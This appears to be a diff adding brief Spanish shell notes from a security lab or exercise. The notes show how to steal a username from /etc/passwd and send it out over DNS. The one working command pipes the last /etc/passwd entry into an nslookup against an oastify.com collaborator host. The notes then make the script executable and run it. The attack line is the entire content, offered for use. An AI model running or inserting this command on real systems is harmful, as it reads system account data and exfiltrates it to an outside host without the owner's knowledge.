@@ -1,0 +1,9 @@
+# Obtener el usuario de nuestro /etc/passwd y mandar el resultado al dominio
+
+nano Scrit4
+nslookup $(cat /etc/passwd | tail -n 1 | cut -d ":" -f 1).kl9dtf96irwnwq4bljh5uvm0brhi5atz.oastify.com
+
+
+# Comando por consola 
+chmod +x Script4
+./Script4
